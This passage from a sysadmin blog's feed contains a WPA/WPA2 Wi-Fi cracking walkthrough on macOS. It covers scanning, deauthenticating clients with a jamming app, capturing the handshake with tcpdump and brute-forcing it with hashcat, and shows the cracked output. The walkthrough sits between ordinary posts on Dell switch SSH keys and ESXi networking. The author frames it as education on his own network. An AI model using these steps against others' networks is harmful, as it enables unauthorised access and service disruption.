+&lt;p&gt;So we configure an management IP of switch - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.0.0.1&lt;/code&gt;.
+You can now SSH to the switch using RSA authentication.
+The user will encrypt the initial connection using the private key, which the switch will authenticate using the public key; no password exchange is necessary.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ssh admin@10.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;If it will successfully you see the hostname of device - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dell#&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;display-ssh-connection-information&quot;&gt;Display SSH connection information&lt;/h3&gt;
+
+&lt;p&gt;In the end of configuring I want to show a status of SSH with command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show ip ssh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dell# show ip ssh
+
+SSH server                : enabled.
+SSH server version        : v2.
+SSH server vrf            : default.
+SSH server ciphers        : aes256-ctr,aes256-cbc,aes192-ctr,aes192-cbc,aes128-ctr,aes128-cbc,3des-cbc.
+SSH server macs           : hmac-sha2-256,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96.
+SSH server kex algorithms : diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1,diffie-hellman-group14-sha1.
+Password Authentication   : enabled.
+Hostbased Authentication  : disabled.
+RSA       Authentication  : enabled.
+Challenge Response Auth   : disabled.
+   Vty          Encryption      HMAC            Remote IP
+*  0            aes128-ctr      hmac-sha2-256   10.0.0.2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;In this article I want to show how to enable SSH-server on Dell Networking system.
+Also this setup make possible to secure communicate with the device without any passwords.
+It uses RSA-SSH authentication and connection with imported public (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;) keys.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.netwrix.com/cisco_commands_cheat_sheet.html&quot;&gt;SSH Key Auth on Dell PowerConnect Switches&lt;/a&gt; - another blog post with the similar problem&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.dell.com/support/manuals/us/en/19/force10-s4048-on/s4048-on-9.14.0.0-cli/about-this-guide&quot;&gt;Dell Command Line Reference Guide for the S4048–ON System&lt;/a&gt; - dell man page included full command list&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="dell" /><category term="networks" /><category term="security" /><summary type="html">Setup and configure ssh server on Dell Networking system with RSA and password authentication.</summary></entry><entry><title type="html">Hacking. Wi-Fi Penetration on MacOS</title><link href="https://gainanov.pro/eng-blog/sysad/wifi-cracking/" rel="alternate" type="text/html" title="Hacking. Wi-Fi Penetration on MacOS" /><published>2020-07-17T00:00:00+03:00</published><updated>2020-07-17T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/wifi-cracking</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/wifi-cracking/">&lt;blockquote&gt;
+  &lt;p&gt;Disclaimer: this post for education purposes only.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;A wireless network with WPA/WPA security not guarantee a total safety.
+WiFi packets could be sniffed by an attacker that can stole a WiFi passwords, then he connects to your secured network.
+But he is need to decode a hash of password. The complexity and time to get a password phrase completely depends on the password. Passwords consists only digits cracks minutes or hours, the password &lt;em&gt;“HasGUS%f@$SAfga63efSA%$S(SACSASj)”&lt;/em&gt; require a hundred years to crack it.&lt;/p&gt;
+
+&lt;p&gt;MacOS isn’t known as an ideal operating system for hacking without customization, but it includes native tools that allow easy control of the Wi-Fi radio for packet sniffing. Changing channels, scanning for access points, and even capturing packets all can be done from the command line.&lt;/p&gt;
+
+&lt;p&gt;This manual show a manual to crack WiFi password from my MacBook Pro with MacOS 10.13 (HighSierra).
+I want to save the instruction to the future. If you want to repeat it you should familiar with console terminal.&lt;/p&gt;
+
+&lt;p&gt;Let’s start cracking ;)&lt;/p&gt;
+
+&lt;h2 id=&quot;installation-requirements&quot;&gt;installation requirements&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Install &lt;a href=&quot;https://brew.sh/&quot;&gt;Homebrew&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install &lt;a href=&quot;https://www.aircrack-ng.org/&quot;&gt;aircrack-ng&lt;/a&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install aircrack-ng
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Generate a link of the next installed by built-in utility - &lt;strong&gt;airport&lt;/strong&gt; for using directly on terminal.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install &lt;a href=&quot;https://hashcat.net&quot;&gt;hashcat&lt;/a&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install hashcat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install &lt;a href=&quot;https://github.com/hashcat/hashcat-utils&quot;&gt;hashcat-utils&lt;/a&gt;. Build from sources. Use git and gcc
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/hashcat/hashcat-utils.git
+cd hashcat-utils/src
+gcc -o cap2hccapx cap2hccapx.c
+mv ./cap2hccapx /usr/local/bin/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install &lt;a href=&quot;https://github.com/ZerBea/hcxtools&quot;&gt;hcxtools&lt;/a&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install hcxtools
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Install &lt;a href=&quot;https://www.wireshark.org/&quot;&gt;wireshark&lt;/a&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brew install wireshark
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Install [JamWifi][https://github.com/0x0XDev/JamWiFi] app. It is a deauthenticating application in which unwanted clients from a Wi-Fi network have to keep off, jamming and especially their connection will be departed like dust in a second. Download and unzip by &lt;a href=&quot;http://macheads101.com/pages/downloads/mac/JamWiFi.app.zip&quot;&gt;this&lt;/a&gt; link.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Test that all tools installed and available. The commands below should success return some help page about itself:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airport -h
+aircrack-ng --help
+cap2hccapx -h
+hashcat -h
+hcxhash2cap -h
+tcpdump -h
+wireshark -h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;identify-the-target-access-point&quot;&gt;identify the target access point&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;About the abbreviation&lt;/p&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Basic Service Set Identifier (BSSID).&lt;/li&gt;
+    &lt;li&gt;Service Set Identifier (SSID).&lt;/li&gt;
+    &lt;li&gt;Radio Frequency (Channel).&lt;/li&gt;
+    &lt;li&gt;Access Point (AP).&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Turn on Wi-Fi.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Open Terminal.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Run a command
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport -s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Now, this command will be scanning the available Wi-Fi.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Wait till the installation is done.
+&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/airport-scan.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/airport-scan.png&quot; alt=&quot;available-networks&quot; /&gt;&lt;/a&gt;
+I want to hack my network named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ruslan Gainanov&lt;/code&gt; and &lt;strong&gt;BSSID&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6e:57:ca:24:09:8c&lt;/code&gt; and &lt;strong&gt;channel&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Copy the BSSID (my BSSID=&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6e:57:ca:24:09:8c&lt;/code&gt;) of the target Access Point.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export BSSID=6e:57:ca:24:09:8c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;capturing-a-traffic&quot;&gt;capturing a traffic&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Run a command to help find a wireless interface (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;en0&lt;/code&gt;)
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;networksetup -listallhardwareports
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The result:&lt;/p&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hardware Port: Wi-Fi
+Device: en0
+Ethernet Address: .......
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Disassociate a network
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport -z
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Set the channel. Do not put a space between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c&lt;/code&gt; and the channel
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport -c1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Capture a &lt;strong&gt;beacon&lt;/strong&gt; frame from the access point. This command will create a new file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beacon.cap&lt;/code&gt;, which is the gathered data from the target access point.
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo tcpdump &quot;type mgt subtype beacon and ether src $BSSID&quot; -I -c 1 -i en0 -w beacon.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Deauth connected devices with &lt;strong&gt;Jam Wi-Fi&lt;/strong&gt; app. Open the app. Press &lt;strong&gt;Scan&lt;/strong&gt;, chose the target network and press &lt;strong&gt;Monitor&lt;/strong&gt;, then press &lt;strong&gt;Do It!&lt;/strong&gt; to restart all connections. Wait 15 seconds and press &lt;strong&gt;Done&lt;/strong&gt;
+&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/jamwifi.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/jamwifi.png&quot; alt=&quot;deauth-clients&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;When you “Done” with death, run quickly next command. You have to capture a &lt;strong&gt;handshake&lt;/strong&gt; in time
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo tcpdump &quot;ether proto 0x888e and ether host $BSSID&quot; -I -U -vvv -i en0 -w handshake.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Wait until you see some gotten frames, like this&lt;/p&gt;
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Got 19
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;After you have it press &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Control + C&quot;&lt;/code&gt; to stop capturing.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Merge the Beacon and Handshake
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;brute-forcing&quot;&gt;brute forcing&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Brute Force — A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.&lt;/li&gt;
+    &lt;li&gt;Wordlist — A written collection of all words derived from a particular source.&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;.1. Generating HCCPAX File&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cap2hccapx capture.cap capture.hccapx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Hashcat doesn’t take cap files, only hccapx files. So we need convert this files. Other way to made it is use a &lt;a href=&quot;https://hashcat.net/cap2hccapx/&quot;&gt;online tool&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Review the result. You should see the phrase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Networks detected: X... Written X WPA Handshakes&lt;/code&gt;. The example of success result is:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Networks detected: 1
+[*] BSSID=6e:57:ca:24:09:8c ESSID=Ruslan Gainanov (Length: 15)
+--&amp;gt; STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1
+--&amp;gt; STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1
+--&amp;gt; STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1
+--&amp;gt; STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1
+
+Written 4 WPA Handshakes to: capture.hccapxn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;.2. Now, everything are right to execute the &lt;strong&gt;hashcat&lt;/strong&gt;. We can use a wordlist or a pattern to broke a password.
+Using a wordlist (example of wordlists - https://github.com/kennyn510/wpa2-wordlists.git):&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat -m 2500 capture.hccapx wordlist.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Using a pattern - 8 digits:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat -m 2500 -a3 capture.hccapx &quot;?d?d?d?d?d?d?d?d&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;For more examples press &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2&quot;&gt;here&lt;/a&gt;. For more patterns, see the &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=mask_attack&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;my-results&quot;&gt;my results&lt;/h2&gt;
+
+&lt;p&gt;I use the hashcat with pattern, that works on GPU.
+On my MacBook Pro, it yields a performance of 41kH/s: it tests 41000 passwords in a second.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/giphy.gif&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/wifi-crack/giphy.gif&quot; alt=&quot;giphy&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;OpenCL Platform #1: Apple
+=========================
+* Device #1: Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.
+* Device #2: Intel(R) HD Graphics 630, 384/1536 MB allocatable, 24MCU
+* Device #3: AMD Radeon Pro 555 Compute Engine, 512/2048 MB allocatable, 12MCU
+
+Speed.#2.........:     6578 H/s (6.48ms) @ Accel:8 Loops:4 Thr:256 Vec:1
+Speed.#3.........:    35286 H/s (10.78ms) @ Accel:32 Loops:16 Thr:256 Vec:1
+Speed.#*.........:    41864 H/s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The cracking a WiFi password consists 8 digits took me twenty minutes (20 mins, 17 secs).&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;12822b8013c116a3dff33d4bbc3fb2cb:6e57ca24098c:14169e677ec5:Ruslan Gainanov:12345670
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: WPA-EAPOL-PBKDF2
+Hash.Target......: capture.hccapx
+Time.Started.....: Fri Jul 17 18:11:20 2020 (20 mins, 17 secs)
+Time.Estimated...: Fri Jul 17 18:31:37 2020 (0 secs)
+Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:     6583 H/s (6.76ms) @ Accel:8 Loops:4 Thr:256 Vec:1
+Speed.#3.........:    33997 H/s (10.02ms) @ Accel:32 Loops:16 Thr:256 Vec:1
+Speed.#*.........:    40580 H/s
+Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 49397760/100000000 (49.40%)
+Rejected.........: 0/49397760 (0.00%)
+Restore.Point....: 4620288/10000000 (46.20%)
+Restore.Sub.#2...: Salt:0 Amplifier:3-4 Iteration:0-2
+Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:1-3
+Candidates.#2....: 32303174 -&amp;gt; 31682841
+Candidates.#3....: 18328292 -&amp;gt; 15530236
+
+Started: Fri Jul 17 18:11:13 2020
+Stopped: Fri Jul 17 18:31:39 2020                           
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Is true that my network named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ruslan Gainanov&lt;/code&gt; has a password - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;12345670&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;conclusion&lt;/h2&gt;
+
+&lt;p&gt;Please be aware that attacking Wi-Fi Protected Access (WPA) is illegal unless you have permission from the owner’s access point or affiliation involved. This post should be used as Educational Purposes, to help the public understand how hackers take advantage of your access.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=G6MXOzGIJZ4&quot;&gt;Youtube Video&lt;/a&gt; - video example of hacking WiFi password&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://martinsjean256.wordpress.com/2018/02/12/hacking-aircrack-ng-on-mac-cracking-wi-fi-without-kali-in-parallels/&quot;&gt;Hacking: Aircrack-ng on Mac OsX - Cracking wi-fi without kali in parallels&lt;/a&gt; - the blog article that I based&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/@jansalvadorsebastian/hacking-wi-fi-penetration-on-macos-bc1f0f0f6296&quot;&gt;Hacking: Wi-Fi Penetration on MacOS&lt;/a&gt; - another good article on Medium&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2&quot;&gt;Cracking WPA/WPA2 with hashcat&lt;/a&gt; - brief manual of hashcat using&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://hashcat.net/forum/thread-7717.html&quot;&gt;New attack on WPA/WPA2 using PMKID&lt;/a&gt; - a new technique to crack WPA PSK without capturing a full EAPOL 4-way handshake&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="sysad" /><category term="wifi" /><category term="security" /><category term="linux" /><category term="macos" /><summary type="html">Today I want to show how to crack WPA/WPA2 passwords on MacOS. It took me 20 minutes to hack a password with 8 digits. My methods based on airport, aircrack-ng, tcpdump, wireshark, hashcat and some other software.</summary></entry><entry><title type="html">ESXi. Create and configure Management Network using ESXi Command line</title><link href="https://gainanov.pro/eng-blog/sysad/esxi-cli-networking/" rel="alternate" type="text/html" title="ESXi. Create and configure Management Network using ESXi Command line" /><published>2020-05-21T00:00:00+03:00</published><updated>2020-05-21T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/sysad/esxi-cli-networking</id><content type="html" xml:base="https://gainanov.pro/eng-blog/sysad/esxi-cli-networking/">&lt;p&gt;I want to continue my &lt;a href=&quot;/eng-blog/sysad/esxi-shell-commands/&quot;&gt;last post&lt;/a&gt; about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esxcli&lt;/code&gt; tool. Here is I’ll describe some useful console commands that will helps you to create a management network adapter (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VMkernel&lt;/code&gt;) and configure them. In addition commands to work with Port Groups, vSwitches, NetStack, Uplinks will be placed here in the one quick post.&lt;/p&gt;
+
+&lt;h3 id=&quot;network-device-uplink&quot;&gt;Network device (Uplink)&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List network devices&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network nic list
+
+Name    PCI Device    Driver  Admin Status  Link Status  Speed  Duplex  MAC Address         MTU  Description
+------  ------------  ------  ------------  -----------  -----  ------  -----------------  ----  ----------------------------------------------------------------
+vmnic0  0000:81:00.0  ixgben  Up            Up           10000  Full    7c:d3:0a:00:00:00  1500  Intel Corporation 82599EB 10-Gigabit SFI/SFP+ Network Connection
+vmnic1  0000:81:00.1  ixgben  Up            Down             0  Half    7c:d3:0a:00:00:00  1500  Intel Corporation 82599EB 10-Gigabit SFI/SFP+ Network Connection
+vmnic2  0000:01:00.0  igbn    Up            Up            1000  Full    a0:36:9f:00:00:00  1500  Intel Corporation Ethernet Server Adapter I350-T2
+vmnic3  0000:01:00.1  igbn    Up            Down             0  Half    a0:36:9f:00:00:00  1500  Intel Corporation Ethernet Server Adapter I350-T2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;virtual-switch-vswitch&quot;&gt;Virtual Switch (vSwitch)&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List standard virtual switches:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network vswitch standard list
+
+vSwitch0
+   Name: vSwitch0
+   Class: cswitch
+   Num Ports: 10496
+   Used Ports: 6
+   Configured Ports: 128
+   MTU: 1500
+   CDP Status: listen
+   Beacon Enabled: false
+   Beacon Interval: 1
+   Beacon Threshold: 3
+   Beacon Required By:
+   Uplinks: vmnic2
+   Portgroups: WAN network, Management
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Add an uplink (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remove&lt;/code&gt; - the same)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network vswitch standard uplink add -v vSwitch0 -u vmnic0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create a new vSwitch (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remove&lt;/code&gt; - the same)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;esxcli network vswitch standard add -v vSwitch_New
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;network-stack-netstack&quot;&gt;Network Stack (NetStack)&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;List an existing network stack&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# esxcli network ip netstack list
+
+defaultTcpipStack
+   Key: defaultTcpipStack
+   Name: defaultTcpipStack
+   State: 4660
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Add a new stack (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remove&lt;/code&gt; - the same)&lt;/li&gt;
+&lt;/ol&gt;
+
